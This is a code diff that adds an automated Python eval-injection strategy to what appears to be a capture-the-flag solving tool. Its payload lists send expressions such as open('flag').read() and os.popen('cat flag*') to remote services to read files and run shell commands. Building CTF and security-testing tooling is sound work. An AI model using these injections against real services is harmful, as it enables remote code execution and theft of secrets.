@@ -135,6 +135,7 @@ class Unit(BaseUnit):
     def enumerate(self) -> Generator[Any, None, None]:
         """Yield interaction strategies to try."""
         yield "banner"
+        yield "eval_injection"
         yield "math_solver"
         yield "interactive"
 
@@ -150,12 +151,137 @@ class Unit(BaseUnit):
         try:
             if case == "banner":
                 self._banner_grab()
+            elif case == "eval_injection":
+                self._eval_injection()
             elif case == "math_solver":
                 self._math_solver()
             elif case == "interactive":
                 self._interactive_probe()
         except (socket.error, OSError, ConnectionRefusedError):
             pass
+
+    def _eval_injection(self):
+        """
+        Try Python eval/input injection against the remote service.
+
+        Python 2's input() calls eval() on user input, so sending Python
+        expressions like variable names or open("flag").read() can leak
+        data. This handles multi-prompt services by answering each prompt
+        with increasingly aggressive injection payloads.
+        """
+
+        # Payloads ordered from safe variable references to code execution.
+        # Each list is a sequence of answers to send for consecutive prompts.
+        payload_sequences = [
+            # Try reading flag files directly via eval
+            [
+                b'open("flag").read()',
+                b'open("flag").read()',
+            ],
+            [
+                b'open("flag.txt").read()',
+                b'open("flag.txt").read()',
+            ],
+            # OS command injection via eval
+            [
+                b'__import__("os").popen("cat flag*").read()',
+                b'__import__("os").popen("cat flag*").read()',
+            ],
+            [
+                b'__import__("os").popen("cat flag.txt").read()',
+                b'__import__("os").popen("cat flag.txt").read()',
+            ],
+            # Variable name references (Python 2 input() evals these)
+            # Handles challenges where the answer is stored in a variable
+            [b"flag", b"flag"],
+            [b"key", b"key"],
+            [b"secret", b"secret"],
+            [b"password", b"password"],
+            [b"answer", b"answer"],
+        ]
+
+        # Also try a smart multi-prompt session: answer each prompt with
+        # the variable that the prompt seems to be asking about.
+        # e.g. "Number?" -> send the year variable; "City?" -> send city
+        try:
+            sock = self._connect()
+            try:
+                all_data = b""
+                max_prompts = 10
+
+                for _ in range(max_prompts):
+                    data = recv_until_quiet(sock, timeout=3.0)
+                    if not data:
+                        break
+                    all_data += data
+                    self.manager.register_data(self, data)
+
+                    data_lower = data.lower()
+
+                    # Try to figure out what variable/expression to send
+                    # based on the prompt content
+                    injections = []
+
+                    # If it asks for a number/year, try common number vars
+                    if b"number" in data_lower or b"year" in data_lower:
+                        injections = [b"year", b"num", b"number", b"n", b"2018", b"2024"]
+                    # If it asks for a city/place/location
+                    elif b"city" in data_lower or b"place" in data_lower or b"location" in data_lower:
+                        injections = [b"city", b"place", b"location", b"town", b"answer"]
+                    # If it asks for a name
+                    elif b"name" in data_lower:
+                        injections = [b"name", b"username", b"user", b"admin"]
+                    # If it asks for a password/secret/key
+                    elif b"password" in data_lower or b"secret" in data_lower or b"key" in data_lower:
+                        injections = [b"password", b"secret", b"key", b"passwd", b"flag"]
+                    # Generic prompt — try flag-related expressions
+                    elif any(p.search(data) for p in PROMPT_PATTERNS):
+                        injections = [
+                            b"flag",
+                            b'open("flag").read()',
+                            b'open("flag.txt").read()',
+                            b'__import__("os").popen("cat flag*").read()',
+                        ]
+                    else:
+                        # No recognizable prompt, stop
+                        break
+
+                    # Send the first injection that makes sense
+                    if injections:
+                        sock.sendall(injections[0] + b"\n")
+                        time.sleep(0.3)
+
+                # Grab any final output
+                final = recv_until_quiet(sock, timeout=3.0)
+                if final:
+                    self.manager.register_data(self, final)
+
+            finally:
+                sock.close()
+        except (socket.error, OSError, ConnectionRefusedError):
+            pass
+
+        # Also try each fixed payload sequence as a separate connection
+        for payloads in payload_sequences:
+            try:
+                sock = self._connect()
+                try:
+                    for payload in payloads:
+                        data = recv_until_quiet(sock, timeout=3.0)
+                        if not data:
+                            break
+                        self.manager.register_data(self, data)
+                        sock.sendall(payload + b"\n")
+                        time.sleep(0.3)
+
+                    # Get final output
+                    final = recv_until_quiet(sock, timeout=3.0)
+                    if final:
+                        self.manager.register_data(self, final)
+                finally:
+                    sock.close()
+            except (socket.error, OSError, ConnectionRefusedError):
+                continue
 
     def _banner_grab(self):
         """Connect and grab the banner, then try sending common inputs."""
